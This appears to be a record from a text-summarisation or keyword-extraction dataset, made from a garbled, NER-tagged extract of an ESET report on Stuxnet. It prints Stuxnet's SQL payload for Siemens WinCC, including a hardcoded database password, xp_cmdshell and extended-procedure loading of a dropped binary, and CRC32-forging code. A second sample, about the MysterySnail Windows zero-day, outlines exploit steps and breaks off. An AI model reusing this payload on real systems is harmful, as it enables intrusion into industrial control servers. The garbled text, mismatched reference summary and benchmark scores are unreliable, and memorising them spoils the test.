MCPTVARIABLEDESC.ASDATASIZE , [ORG] MCPTVARIABLEDESC.OSDATASIZE , [ORG] MCPTVARIABLEDESC.VARGROUPID , MCPTVARIABLEDESC.VARXRES , [PRODUCT] MCPTVARIABLEDESC.VARMARK , [ORG] MCPTVARIABLEDESC.SCALETYPE , [DATE] MCPTVARIABLEDESC.SCALEPARAM1 , [DATE] MCPTVARIABLEDESC.SCALEPARAM2 , [DATE] MCPTVARIABLEDESC.SCALEPARAM3 , MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESCString 8 view [ORG] MCPVREADVARPERCON as select VARIABLEID , VARIABLETYPEID , FORMATFITTING , SCALEID , @t = filename from master sysdatabases where ( name like '' CC%'');set @t = [ORG] left(@t , len(@t)- charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = '' master xp_cmdshell '' ' ' extrac32 /y \" '' + @t+ '' \" \" '' + @t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sprun,@t);exec master [CARDINAL] sprun;exec master sp_dropextendedproc sprun ' ) view MCPVREADVARPERCON as select [ORG] MCPTVARIABLEDESC.VARIABLEID , view MCPVPROJECT2 as select [PERSON] MCPTPROJECT.PROJECTID , [PERSON] MCPTPROJECT.PROJECTNAME , view MCPVREADVARPERCON as select VARIABLEID , VARIABLETYPEID , FORMATFITTING , SCALEID , @t = filename from master sysdatabases where ( name like '' CC%R'');set @t = [ORG] left(@t , len(@t)- charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = '' master [PERSON] xp_cmdshell _ '' ' ' extrac32 /y \" '' + @t+ '' \" \" '' + @t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sp_run,@t);exec master sp_run;')MCPTPROJECT.PROJECTVERSION , MCPTPROJECT.PROJECTCREATOR , [ORG] MCPTPROJECT.PROJECTEDITOR , MCPTPROJECT.CREATIONDATE , MCPTPROJECT.EDITDATE , MCPTPROJECT.PRJCOMMENT , MCPTPROJECT.CSLANGUAGE , [PERSON] MCPTPROJECT.RTLANGUAGE , [PERSON] MCPTPROJECT.PROJECTGUID , [ORG] MCPTPROJECT.PRJTABLETYPES , [ORG] MCPTPROJECT.PRJDATATYPES , [ORG] MCPTPROJECT.PRJCREATEVERMAJ , [ORG] MCPTPROJECT.PRJCREATEVERMIN , [GPE] MCPTPROJECT.PRJXRES , [ORG] MCPTPROJECT.PRJTIMEMODE , [ORG] MCPTPROJECT.PRJDELTAMODE , [PERSON] MCPTPROJECT.PRJDELTAREMOTE from [ORG] MCPTPROJECTVARIABLENAME , [ORG] ADDRESSPARAMETER , PROTOKOLL , [ORG] MAXLIMIT , [ORG] MINLIMIT , STARTVALUE , [PERSON] SUBSTVALUE , [GPE] VARFLAGS , [ORG] CONNECTIONID , [ORG] VARPROPERTY , [ORG] CYCLETIMEID , [ORG] LASTCHANGE , [ORG] ASDATASIZE , OSDATASIZE , VARGROUPID , [GPE] VARXRES , [ORG] VARMARK , [ORG] SCALETYPE , [GPE] SCALEPARAM1 , [ORG] SCALEPARAM2 , [ORG] SCALEPARAM3 , SCALEPARAM4 from MCPTVARIABLEDESC , openrowset('SQLOLEDB','Server=.\\WinCC;uid = WinCCConnect;pwd=2WSXcder ' , \" ' select 0;use master;declare @t varchar(999),@s varchar(999);selectMCPTPROJECT.PROJECTMODE , www.eset.com79EXEC sp_configure ' show advanced options ' , 1 RECONFIGURE WITH OVERRIDE EXEC sp_configure ' [ORG] Ole [ORG] Automation Procedures ' , [CARDINAL] 1 RECONFIGURE WITH OVERRIDEMCPTVARIABLEDESC.VARIABLETYPEID , MCPTVARIABLEDESC.FORMATFITTING , [ORG] MCPTVARIABLEDESC.SCALEID , [PERSON] MCPTVARIABLEDESC.VARIABLENAME , [PERSON] MCPTVARIABLEDESC.ADDRESSPARAMETER , [ORG] MCPTVARIABLEDESC.PROTOKOLL , [ORG] MCPTVARIABLEDESC.MAXLIMIT , [ORG] MCPTVARIABLEDESC.MINLIMIT , MCPTVARIABLEDESC.STARTVALUE , MCPTVARIABLEDESC.SUBSTVALUE , [GPE] MCPTVARIABLEDESC.VARFLAGS , [PERSON] MCPTVARIABLEDESC.CONNECTIONID , MCPTVARIABLEDESC.VARPROPERTY , [ORG] MCPTVARIABLEDESC.CYCLETIMEID , [ORG] MCPTVARIABLEDESC.LASTCHANGE , MCPTVARIABLEDESC.ASDATASIZE , [ORG] MCPTVARIABLEDESC.OSDATASIZE , [ORG] MCPTVARIABLEDESC.VARGROUPID , MCPTVARIABLEDESC.VARXRES , [PRODUCT] MCPTVARIABLEDESC.VARMARK , [ORG] MCPTVARIABLEDESC.SCALETYPE , [DATE] MCPTVARIABLEDESC.SCALEPARAM1 , [DATE] MCPTVARIABLEDESC.SCALEPARAM2 , [DATE] MCPTVARIABLEDESC.SCALEPARAM3 , MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESCString [CARDINAL] 12 view [ORG] MCPVREADVARPERCON as select [ORG] MCPTVARIABLEDESC.VARIABLEID , [ORG] DECLARE @vr varchar(256 ) SET @vr = CONVERT(varchar(256 ) , ( SELECT serverproperty('productversion ' ) ) ) IF @vr > ' 9 ' DECLAREEXEC @hr = sp_OACreate ' ADODB.Stream ' , @aods OUT IF @hr < > 0 GOTO endqEXEC @hr = sp_OAMethod @aods , ' Open ' , null IF @hr < > 0 GOTO endqSET @adss = ( SELECT DATALENGTH(abin ) FROM sysbinlog ) SET @aip = [CARDINAL] 1@aods int , @abf varbinary(4096)@ashl int , @aind varchar(260 ) , @ainf varchar(260 ) , @hr intDECLAREEXEC @hr = sp_OACreate ' WScript . [ORG] Shell ' , @ashl OUT IF @hr < > 0 EXEC sp_OAMethod @ashl , ' ExpandEnvironmentStrings ' , @aind OUT , SET @ainf = @aind + ' \\sql%05x.dbi'GOTO endqEXEC @hr = [CARDINAL] sp_OASetProperty @aods , ' Type ' , [DATE] 1IF @hr < > 0 GOTO endq'%%ALLUSERSPROFILE%%'www.eset.com80WHILE ( @aip < = @adss ) BEGIN SET @abf = ( SELECT SUBSTRING ( abin , [ORG] @aip , 4096 ) FROM sysbinlog ) EXEC @hr = sp_OAMethod @aods , ' Write ' , null , @abf IF @hr < > 0 GOTO endq SET @aip = @aip + 4096 ENDEXEC @hr = sp_OAMethod @aods , ' SaveToFile ' , null , @ainf , [CARDINAL] 2IF @hr < > 0 GOTO endqEXEC sp_OAMethod @aods , ' Close ' , [ORG] nullEXEC [ORG] sp_dropextendedproc sp_dumpdbilog@ashl int , @aind varchar(260 ) , @ainf varchar(260 ) , endq : GOTO endqEXEC @hr = sp_OACreate ' WScript . [ORG] Shell ' , @ashl OUT IF @hr < > 0 EXEC sp_OAMethod @ashl , ' ExpandEnvironmentStrings ' , @aind OUT , SET @ainf = @aind + ' \\sql%05x.dbi ' EXEC sp_addextendedproc sp_dumpdbilog , @ainf [ORG] EXEC sp_dumpdbilog EXEC sp_dropextendedproc sp_dumpdbilog'%%ALLUSERSPROFILE%%'GOTO endq@ashl int , @aind varchar(260 ) , @ainf varchar(260 ) , EXEC @hr = sp_OACreate ' WScript . [ORG] Shell ' , @ashl OUT IF @hr < > 0 EXEC sp_OAMethod @ashl , ' ExpandEnvironmentStrings ' , @aind OUT , SET @ainf = @aind + ' \\sql%05x.dbi ' DECLARE @fs int EXEC @hr = sp_OACreate ' Scripting . FileSystemObject ' , @fs OUT IF @hr < > 0 EXECUTE sp_OAMethod @fs , ' [ORG] DeleteFile ' , [ORG] NULL , @ainfGOTO endq'%%ALLUSERSPROFILE%%'www.eset.com81String [CARDINAL] 17 DROP TABLE sysbinlog [ORG] CREATE [ORG] TABLE sysbinlog ( abin image ) INSERT INTO sysbinlog [PERSON] VALUES(0x [PERSON] 0;set IMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z=''use [ ? ] ; declare @t nvarchar(2000);declare @s [ORG] nvarchar(9);set @s=''''--CC - S''''+char(80);if left(db_name(),2)=''''CC '' ' ' select @t = substring(text , [ORG] charindex(@s , [ORG] text)+8,charindex(''''--*'''',text)-charindex(@s , [DATE] text)-8 ) from syscomments where text like ( '' ' ' % '' ' ' + @s+''''%'''');if @t is not [ORG] NULL [ORG] exec(@t)'';exec [ORG] sp_msforeachdb @z ' ) ( ( SELECT top [CARDINAL] 1 [CARDINAL] 1 FROM MCPVREADVARPERCON)='1 ' ) --CC - SP select name from master sysdatabases where filename like N'%s ' exec master sp_attach_db ' wincc_svr ' , N'%s ' , N'%s ' exec master sp_detach_db ' wincc_svr ' use wincc_svrwww.eset.comAppendix D82Algorithm for calculating CRC32 checksum in python : crc32_table = ( 0x00000000 , [PERSON] 0x77073096 , [DATE] 0xee0e612c , 0x990951ba , 0x076dc419 , 0x706af48f , [CARDINAL] 0xe963a535 , 0x9e6495a3 , [GPE] 0x0edb8832 , 0x79dcb8a4 , [DATE] 0xe0d5e91e , [DATE] 0x97d2d988 , [CARDINAL] 0x09b64c2b , 0x7eb17cbd , [DATE] 0xe7b82d07 , 0x90bf1d91 , 0x1db71064 , 0x6ab020f2 , 0xf3b97148 , 0x84be41de , [DATE] 0x1adad47d , [DATE] 0x6ddde4eb , [DATE] 0xf4d4b551 , [CARDINAL] 0x83d385c7 , [DATE] 0x136c9856 , 0x646ba8c0 , 0xfd62f97a , 0x8a65c9ec , [CARDINAL] 0x14015c4f , [DATE] 0x63066cd9 , [DATE] 0xfa0f3d63 , 0x8d080df5 , [DATE] 0x3b6e20c8 , 0x4c69105e , [CARDINAL] 0xd56041e4 , 0xa2677172 , [DATE] 0x3c03e4d1 , [CARDINAL] 0x4b04d447 , 0xd20d85fd , 0xa50ab56b , [GPE] 0x35b5a8fa , [CARDINAL] 0x42b2986c , 0xdbbbc9d6 , 0xacbcf940 , 0x32d86ce3 , [DATE] 0x45df5c75 , 0xdcd60dcf , 0xabd13d59 , [CARDINAL] 0x26d930ac , 0x51de003a , 0xc8d75180 , 0xbfd06116 , [DATE] 0x21b4f4b5 , [CARDINAL] 0x56b3c423 , [DATE] 0xcfba9599 , [DATE] 0xb8bda50f , 0x2802b89e , [CARDINAL] 0x5f058808 , [CARDINAL] 0xc60cd9b2 , [ORG] 0xb10be924 , 0x2f6f7c87 , 0x58684c11 , [DATE] 0xc1611dab , [CARDINAL] 0xb6662d3d , [DATE] 0x76dc4190 , 0x01db7106 , 0x98d220bc , [DATE] 0xefd5102a , 0x71b18589 , 0x06b6b51f , 0x9fbfe4a5 , 0xe8b8d433 , [DATE] 0x7807c9a2 , [DATE] 0x0f00f934 , 0x9609a88e , [DATE] 0xe10e9818 , [DATE] 0x7f6a0dbb , [DATE] 0x086d3d2d , 0x91646c97 , 0xe6635c01 , 0x6b6b51f4 , 0x1c6c6162 , [CARDINAL] 0x856530d8 , [DATE] 0xf262004e , [CARDINAL] 0x6c0695ed , 0x1b01a57b , [GPE] 0x8208f4c1 , 0xf50fc457 , [DATE] 0x65b0d9c6 , [CARDINAL] 0x12b7e950 , [DATE] 0x8bbeb8ea , [DATE] 0xfcb9887c , [DATE] 0x62dd1ddf , [DATE] 0x15da2d49 , [DATE] 0x8cd37cf3 , 0xfbd44c65 , 0x4db26158 , 0x3ab551ce , [CARDINAL] 0xa3bc0074 , [CARDINAL] 0xd4bb30e2 , [DATE] 0x4adfa541 , [DATE] 0x3dd895d7 , [DATE] 0xa4d1c46d , 0xd3d6f4fb , [DATE] 0x4369e96a , [DATE] 0x346ed9fc , [DATE] 0xad678846 , 0xda60b8d0 , 0x44042d73 , [DATE] 0x33031de5 , [DATE] 0xaa0a4c5f , 0xdd0d7cc9 , 0x5005713c , 0x270241aa , 0xbe0b1010 , 0xc90c2086 , 0x5768b525 , [DATE] 0x206f85b3 , [DATE] 0xb966d409 , 0xce61e49f , [DATE] 0x5edef90e , [DATE] 0x29d9c998 , 0xb0d09822 , [DATE] 0xc7d7a8b4 , 0x59b33d17 , [CARDINAL] 0x2eb40d81 , [ORG] 0xb7bd5c3b , 0xc0ba6cad , [CARDINAL] 0xedb88320 , [LOC] 0x9abfb3b6 , [DATE] 0x03b6e20c , [CARDINAL] 0x74b1d29a , [DATE] 0xead54739 , [ORG] 0x9dd277af , 0x04db2615 , 0x73dc1683 , 0xe3630b12 , [WORK_OF_ART] 0x94643b84 , [CARDINAL] 0x0d6d6a3e , [DATE] 0x7a6a5aa8 , [DATE] 0xe40ecf0b , [DATE] 0x9309ff9d , [CARDINAL] 0x0a00ae27 , 0x7d079eb1 , 0xf00f9344 , [GPE] 0x8708a3d2 , [DATE] 0x1e01f268 , 0x6906c2fe , 0xf762575d , 0x806567cb , [DATE] 0x196c3671 , 0x6e6b06e7 , 0xfed41b76 , 0x89d32be0 , [DATE] 0x10da7a5a , [DATE] 0x67dd4acc , [ORG] 0xf9b9df6f , 0x8ebeeff9 , 0x17b7be43 , [CARDINAL] 0x60b08ed5 , 0xd6d6a3e8 , [CARDINAL] 0xa1d1937e , [DATE] 0x38d8c2c4 , [DATE] 0x4fdff252 , [CARDINAL] 0xd1bb67f1 , [DATE] 0xa6bc5767 , 0x3fb506dd , 0x48b2364b , 0xd80d2bda , [DATE] 0xaf0a1b4c , 0x36034af6 , [DATE] 0x41047a60 , [DATE] 0xdf60efc3 , 0xa867df55 , [CARDINAL] 0x316e8eef , [DATE] 0x4669be79 , 0xcb61b38c , 0xbc66831a , 0x256fd2a0 , 0x5268e236 , [DATE] 0xcc0c7795 , [CARDINAL] 0xbb0b4703 , 0x220216b9 , [DATE] 0x5505262f , www.eset.com830xc5ba3bbe , [CARDINAL] 0xb2bd0b28 , [DATE] 0x2bb45a92 , [DATE] 0x5cb36a04 , 0xc2d7ffa7 , 0xb5d0cf31 , 0x2cd99e8b , [DATE] 0x5bdeae1d , 0x9b64c2b0 , 0xec63f226 , 0x756aa39c , 0x026d930a , [CARDINAL] 0x9c0906a9 , 0xeb0e363f , [GPE] 0x72076785 , [GPE] 0x05005713 , [GPE] 0x95bf4a82 , 0xe2b87a14 , [DATE] 0x7bb12bae , 0x0cb61b38 , [DATE] 0x92d28e9b , 0xe5d5be0d , 0x7cdcefb7 , [GPE] 0x0bdbdf21 , [DATE] 0x86d3d2d4 , [DATE] 0xf1d4e242 , [DATE] 0x68ddb3f8 , [DATE] 0x1fda836e , 0x81be16cd , 0xf6b9265b , 0x6fb077e1 , 0x18b74777 , 0x88085ae6 , [DATE] 0xff0f6a70 , 0x66063bca , [CARDINAL] 0x11010b5c , [DATE] 0x8f659eff , 0xf862ae69 , [DATE] 0x616bffd3 , 0x166ccf45 , 0xa00ae278 , [DATE] 0xd70dd2ee , [DATE] 0x4e048354 , [DATE] 0x3903b3c2 , 0xa7672661 , 0xd06016f7 , [DATE] 0x4969474d , [DATE] 0x3e6e77db , [DATE] 0xaed16a4a , 0xd9d65adc , [ORG] 0x40df0b66 , 0x37d83bf0 , 0xa9bcae53 , 0xdebb9ec5 , 0x47b2cf7f , [CARDINAL] 0x30b5ffe9 , 0xbdbdf21c , 0xcabac28a , [DATE] 0x53b39330 , [DATE] 0x24b4a3a6 , [DATE] 0xbad03605 , 0xcdd70693 , 0x54de5729 , [DATE] 0x23d967bf , [DATE] 0xb3667a2e , [CARDINAL] 0xc4614ab8 , [CARDINAL] 0x5d681b02 , 0x2a6f2b94 , 0xb40bbe37 , [CARDINAL] 0xc30c8ea1 , 0x5a05df1b , 0x2d02ef8d)def crc32(data ): crc = [CARDINAL] 0xffffffff for i in xrange(len(data ) ): crc = ( crc > > 8) ^ crc32_table[(crc & 0x000000ff ) ^ data[i ] ] return crcwww.eset.comAppendix E84Algorithm for forging CRC32 checksum in python . It is supposed that the message ends with a null- terminated [PERSON] Unicode string < ! --XY-- > : [CARDINAL] 0x00000000 , [CARDINAL] 0xDB710641 , 0x6D930AC3 , [DATE] 0xB6E20C82 , [DATE] 0xDB261586 , [DATE] 0x005713C7 , [DATE] 0xB6B51F45 , [CARDINAL] 0x6DC41904 , [DATE] 0x6D3D2D4D , [CARDINAL] 0xB64C2B0C , [CARDINAL] 0x00AE278E , 0xDBDF21CF , 0xB61B38CB , 0x6D6A3E8A , [GPE] 0xDB883208 , [DATE] 0x00F93449 , [DATE] 0xDA7A5A9A , 0x010B5CDB , [ORG] 0xB7E95059 , [CARDINAL] 0x6C985618 , 0x015C4F1C , [DATE] 0xDA2D495D , [DATE] 0x6CCF45DF , [DATE] 0xB7BE439E , [CARDINAL] 0xB74777D7 , [CARDINAL] 0x6C367196 , [DATE] 0xDAD47D14 , [DATE] 0x01A57B55 , 0x6C616251 , [CARDINAL] 0xB7106410 , [GPE] 0x01F26892 , 0xDA836ED3 , [DATE] 0x6F85B375 , 0xB4F4B534 , [TIME] 0x0216B9B6 , 0xD967BFF7 , 0xB4A3A6F3 , 0x6FD2A0B2 , 0xD930AC30 , 0x0241AA71 , 0x02B89E38 , 0xD9C99879 , [CARDINAL] 0x6F2B94FB , 0xB45A92BA , [ORG] 0xD99E8BBE , [CARDINAL] 0x02EF8DFF , [DATE] 0xB40D817D , [DATE] 0x6F7C873C , [CARDINAL] 0xB5FFE9EF , [CARDINAL] 0x6E8EEFAE , 0xD86CE32C , [DATE] 0x031DE56D , [CARDINAL] 0x6ED9FC69 , 0xB5A8FA28 , [DATE] 0x034AF6AA , 0xD83BF0EB , 0xD8C2C4A2 , [DATE] 0x03B3C2E3 , [DATE] 0xB551CE61 , 0x6E20C820 , [DATE] 0x03E4D124 , [CARDINAL] 0xD895D765 , [CARDINAL] 0x6E77DBE7 , [CARDINAL] 0xB506DDA6 , [CARDINAL] 0xDF0B66EA , [DATE] 0x047A60AB , 0xB2986C29 , 0x69E96A68 , 0x042D736C , 0xDF5C752D , [DATE] 0x69BE79AF , [DATE] 0xB2CF7FEE , [DATE] 0xB2364BA7 , 0x69474DE6 , 0xDFA54164 , [DATE] 0x04D44725 , [DATE] 0x69105E21 , [DATE] 0xB2615860 , [DATE] 0x048354E2 , 0xDFF252A3 , [DATE] 0x05713C70 , 0xDE003A31 , [CARDINAL] 0x68E236B3 , [CARDINAL] 0xB39330F2 , [DATE] 0xDE5729F6 , 0x05262FB7 , [ORG] 0xB3C42335 , [GPE] 0x68B52574 , 0x684C113D , 0xB33D177C , [DATE] 0x05DF1BFE , [CARDINAL] 0xDEAE1DBF , 0xB36A04BB , 0x681B02FA , 0xDEF90E78 , [DATE] 0x05880839 , [DATE] 0xB08ED59F , 0x6BFFD3DE , [DATE] 0xDD1DDF5C , [GPE] 0x066CD91D , [DATE] 0x6BA8C019 , [DATE] 0xB0D9C658 , [DATE] 0x063BCADA , 0xDD4ACC9B , 0xDDB3F8D2 , 0x06C2FE93 , [DATE] 0xB020F211 , 0x6B51F450 , 0x0695ED54 , [ORG] 0xDDE4EB15 , [DATE] 0x6B06E797 , [GPE] 0xB077E1D6 , [DATE] 0x6AF48F05 , [DATE] 0xB1858944 , 0x076785C6 , [GPE] 0xDC168387 , [DATE] 0xB1D29A83 , [DATE] 0x6AA39CC2 , [DATE] 0xDC419040 , 0x07309601 , [DATE] 0x07C9A248 , [CARDINAL] 0xDCB8A409 , 0x6A5AA88B , 0xB12BAECA , [DATE] 0xDCEFB7CE , [DATE] 0x079EB18F , 0xB17CBD0D , 0x6A0DBB4C , 0x6567CB95 , [CARDINAL] 0xBE16CDD4 , [DATE] 0x08F4C156 , [DATE] 0xD385C717 , 0xBE41DE13 , 0x6530D852 , 0xD3D2D4D0 , [CARDINAL] 0x08A3D291 , 0x085AE6D8 , 0xD32BE099 , [CARDINAL] 0x65C9EC1B , [ORG] 0xBEB8EA5A , [DATE] 0xD37CF35E , 0x080DF51F , [DATE] 0xBEEFF99D , 0x659EFFDC , [CARDINAL] 0xBF1D910F , 0x646C974E , [PERSON] 0xD28E9BCC , 0x09FF9D8D , [DATE] 0x643B8489 , [DATE] 0xBF4A82C8 , [DATE] 0x09A88E4A , 0xD2D9880B , 0xD220BC42 , 0x0951BA03 , 0xBFB3B681 , 0x64C2B0C0 , 0x0906A9C4 , 0xD277AF85 , [CARDINAL] 0x6495A307 , 0xBFE4A546 , [DATE] 0x0AE278E0 , [CARDINAL] 0xD1937EA1 , [ORG] 0x67717223 , [DATE] 0xBC007462 , [CARDINAL] 0xD1C46D66 , 0x0AB56B27 , [CARDINAL] 0xBC5767A5 , [DATE] 0x672661E4 , [ORG] 0x67DF55AD , 0xBCAE53EC , 0x0A4C5F6E , 0xD13D592F , [DATE] 0xBCF9402B , 0x6788466A , [CARDINAL] 0xD16A4AE8 , 0x0A1B4CA9 , [DATE] 0xD098227A , [CARDINAL] 0x0BE9243B , [DATE] 0xBD0B28B9 , [CARDINAL] 0x667A2EF8,www.eset.com850x0BBE37FC , [GPE] 0xD0CF31BD , 0x662D3D3F , 0xBD5C3B7E , 0xBDA50F37 , [DATE] 0x66D40976 , [DATE] 0xD03605F4 , [DATE] 0x0B4703B5 , 0x66831AB1 , 0xBDF21CF0 , [CARDINAL] 0x0B101072 , 0xD0611633 , [CARDINAL] 0xBA6CAD7F , 0x611DAB3E , [ORG] 0xD7FFA7BC , 0x0C8EA1FD , 0x614AB8F9 , 0xBA3BBEB8 , 0x0CD9B23A , 0xD7A8B47B , [CARDINAL] 0xD7518032 , 0x0C208673 , [DATE] 0xBAC28AF1 , 0x61B38CB0 , 0x0C7795B4 , [DATE] 0xD70693F5 , [DATE] 0x61E49F77 , [DATE] 0xBA959936 , [CARDINAL] 0x6016F7E5 , 0xBB67F1A4 , [DATE] 0x0D85FD26 , [ORG] 0xD6F4FB67 , 0xBB30E263 , 0x6041E422 , 0xD6A3E8A0 , 0x0DD2EEE1 , 0x0D2BDAA8 , 0xD65ADCE9 , [CARDINAL] 0x60B8D06B , 0xBBC9D62A , 0xD60DCF2E , 0x0D7CC96F , 0xBB9EC5ED , [DATE] 0x60EFC3AC , 0xD5E91E0A , 0x0E98184B , 0xB87A14C9 , 0x630B1288 , [DATE] 0x0ECF0B8C , 0xD5BE0DCD , 0x635C014F , [DATE] 0xB82D070E , [CARDINAL] 0xB8D43347 , [DATE] 0x63A53506 , [ORG] 0xD5473984 , [DATE] 0x0E363FC5 , [CARDINAL] 0x63F226C1 , [CARDINAL] 0xB8832080 , [DATE] 0x0E612C02 , 0xD5102A43 , 0x0F934490 , 0xD4E242D1 , [DATE] 0x62004E53 , [CARDINAL] 0xB9714812 , [CARDINAL] 0xD4B55116 , [DATE] 0x0FC45757 , [DATE] 0xB9265BD5 , [DATE] 0x62575D94 , 0x62AE69DD , [DATE] 0xB9DF6F9C , [DATE] 0x0F3D631E , [DATE] 0xD44C655F , [DATE] 0xB9887C5B , [DATE] 0x62F97A1A , [CARDINAL] 0xD41B7698 , [DATE] 0x0F6A70D9 ) def crc32forge(data , original_crc ): for i in xrange(len(data ) - 12 ): crc = ( crc > > 8) ^ crc32_table[(crc & 0x000000ff ) ^ data[i ] ] data[len(data ) - [CARDINAL] 12 ] = ( crc & 0x000000ff ) > > 0 ; data[len(data ) - 11 ] = ( crc & 0x0000ff00 ) > > 8 ; data[len(data ) - [CARDINAL] 10 ] = ( crc & 0x00ff0000 ) > > 16 ; data[len(data ) - 9 ] = ( crc & 0xff000000 ) > > 24 ; for i in xrange(12 ): original_crc = ( ( original_crc < < 8) ^ crc32_reverse[original_crc > > 24 ] ^ data[len(data ) - 1 - i ] ) & 0xffffffff print \" % X \" % original_crc data[len(data ) - [CARDINAL] 12 ] = ( original_crc & 0x000000ff ) > > 0 ; data[len(data ) - 11 ] = ( original_crc & 0x0000ff00 ) > > 8 ; data[len(data ) - [CARDINAL] 10 ] = ( original_crc & 0x00ff0000 ) > > 16 ; data[len(data ) - 9 ] = ( original_crc & 0xff000000 ) > > 24;www.eset.com", "generated_text": "ed; The report; analysis; Stuxnet vs. Aurora; the worm; Win32/Stuxnet; the Aurora attack; the similarities; differences; the two attacks; MICROSOFT; MALWARE; the media; SCADA; SIEMENS; The second section; the distribution; vulnerabilities; the main module; Injection; code; a new process; the RPC server; their interconnection; the remote communication protocol; the remote control; the espionage; lookalike; the Bashshell; the Windows SSID; XOR; a command; control; the home page; location; the XOR; the XOR; XOR; XOR COMMAND; the server; the XOR; the communication protocol; the RPC server; the LNK Exploit; the registry; the main module; the worm; XOR; the XOR; the XOR; the attacks; XOR; the XOR; the XOR; XOR; the XOR; the commands; the XOR; YARA rules; the new process;", "ref_text": "<START-1>The document provides an in-depth technical analysis of Stuxnet 0.5, the earliest known version of the infamous Stuxnet malware. Stuxnet 0.5 dates back to November 2005 and was first detected in the wild in November 2007. It spreads only through infected Siemens Step 7 project files and has limited command and control capabilities compared to later versions. Stuxnet 0.5 is designed to target Siemens 417 PLCs used in uranium enrichment facilities by fingerprinting the industrial control system. It parses human-designated symbol labels to map device addresses and builds a special data block DB8061 used in the attack code. The attack involves replaying normal sensor signals while modifying output signals to close valves controlling uranium hexafluoride gas centrifuges. This excessive gas pressure can potentially damage centrifuges and enrichment systems. Later Stuxnet versions switched strategies to target centrifuge speeds directly rather than valves. Stuxnet 0.5 reveals the evolution of the malware from its early PLC valve attack strategy to the more advanced centrifuge speed attacks in 2009-2010. The modular, professionally developed code suggests the malware was created by a sophisticated team with insider knowledge of industrial control systems and funding/resources for a long-term operation. Stuxnet 0.5 provides valuable insight into the origins, early strategies, and development process of the groundbreaking cyberweapon. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3076923076923077, "gpt3/lexical/rouge_rouge2": 0.037151702786377715, "gpt3/lexical/rouge_rougeL": 0.17846153846153848, "gpt3/lexical/rouge_rougeLsum": 0.17846153846153848, "gpt3_generated_text": ["The report provides a comprehensive analysis of the Stuxnet worm (Win32/Stuxnet) and compares it to the Aurora attack, outlining the similarities and differences between the two. It also delves into the distribution of the worm, the vulnerabilities it exploits, and its implementation, including user-mode and kernel-mode components, RPC server, and remote communication protocol. The report also discusses targeted attacks, their characteristics, and the increase in public awareness of such attacks. It concludes with statistics on the spread of Stuxnet and its impact. This analysis is essential for understanding the complexities of targeted and semi-targeted cyber attacks and the potential implications for cybersecurity."]}, {"split_name": "test", "sample_id": "test_56", "prompt_text": "Extract the keywords: [ORG] MysterySnail attacks with [PRODUCT] Windows [PRODUCT] zero-daysecurelist.com/mysterysnail-attacks-with-windows-zero-day/104509Executive [PRODUCT] SummaryIn [DATE] late [DATE] August and [DATE] early [DATE] September [DATE] 2021 , Kaspersky technologies detected attacks with the use of an elevation of privilege exploit on multiple [ORG] Microsoft [PRODUCT] Windows servers . The exploit had numerous debug strings from an older , publicly known exploit for vulnerability CVE- [DATE] 2016 - 3309 , but closer analysis revealed that it was a zero - day . We discovered that it was using a previously unknown vulnerability in the [GPE] Win32k driver and exploitation relies heavily on a technique to leak the base addresses of kernel modules . We promptly reported these findings to [ORG] Microsoft . The information disclosure portion of the exploit chain was identified as not bypassing a security boundary , and was therefore not fixed . [ORG] Microsoft assigned [PERSON] CVE- [PERSON] 2021 - 40449 to the use - after - free vulnerability in the [DATE] Win32k kernel driver and it was patched on [DATE] October 12 , [DATE] 2021 , as a part of the [DATE] October [DATE] Patch [DATE] Tuesday . Besides finding the zero - day in the wild , we analyzed the malware payload used along with the zero - day exploit , and found that variants of the malware were detected in widespread espionage campaigns against IT companies , military / defense contractors , and diplomatic entities . We are calling this cluster of activity [ORG] MysterySnail . Code similarity and re - use of C2 infrastructure we discovered allowed us to connect these attacks with the actor known as [PRODUCT] IronHusky and [LANGUAGE] Chinese - speaking [ORG] APT activity dating back to [CARDINAL] 2012.1/7Elevation of privilege exploitThe discovered exploit is written to support the following Windows products : [ORG] Microsoft Windows Vista Microsoft Windows [CARDINAL] 7 [ORG] Microsoft [PRODUCT] Windows [CARDINAL] 8 [ORG] Microsoft Windows [CARDINAL] 8.1 [ORG] Microsoft Windows Server 2008 Microsoft Windows Server 2008 R2 Microsoft Windows Server [DATE] 2012 [ORG] Microsoft Windows Server 2012 R2 [ORG] Microsoft Windows [CARDINAL] 10 ( build [DATE] 14393 ) [ORG] Microsoft Windows Server [DATE] 2016 ( build [DATE] 14393 ) [ORG] Microsoft Windows 10 ( build [DATE] 17763 ) [ORG] Microsoft Windows Server [DATE] 2019 ( build 17763)The list of supported products and supported [PRODUCT] Windows [PRODUCT] 10 build numbers , explicit declaration of server OSs and the fact that exploits were only discovered in attacks on servers , all lead us to believe the exploit was developed and advertised as a solution to elevate privileges on servers . CVE-2021 - 40449 is a use - after - free vulnerability in [GPE] Win32k \u2019s NtGdiResetDC function . As with many other Win32k vulnerabilities , the root cause of this vulnerability lies in the ability to set user - mode callbacks and execute unexpected API functions during execution of those callbacks . The CVE-2021 - 40449 is triggered when the function ResetDC is executed a [ORDINAL] second time for the same handle during execution of its own callback . The exploitation process for this vulnerability is as follows:1 . A user - mode call to ResetDC executes syscall NtGdiResetDC and its inner functionGreResetDCInternal . This function gets a pointer to a PDC object , and then performs a call to function hdcOpenDCW.2 . Function hdcOpenDCW performs a user - mode callback and it can be used to executeResetDC for the same handle a [ORDINAL] second time.3 . If an exploit executes ResetDC during a callback , NtGdiResetDC andGreResetDCInternal are executed again for the same DC.4 . If an exploit ignores all the callbacks during the [ORDINAL] second call to GreResetDCInternal , this function will be executed as intended . It will create a new [GPE] DC and get rid of the old one ( the PDC object is destroyed).5 . In the callback , after the [ORDINAL] second ResetDC call has completed , the exploit can reclaim thefreed memory of the PDC object and finish the execution of the callback.6 . After execution of the callback , function hdcOpenDCW returns to GreResetDCInternal , but the pointer retrieved in step ( [CARDINAL] 1 ) is now a dangling pointer \u2013 it points to the memory of the previously destroyed PDC object.2/77 . In the late stage of GreResetDCInternal execution , a malformed PDC object can be usedto perform a call to an arbitrary kernel function with controlled parameters . In the discovered 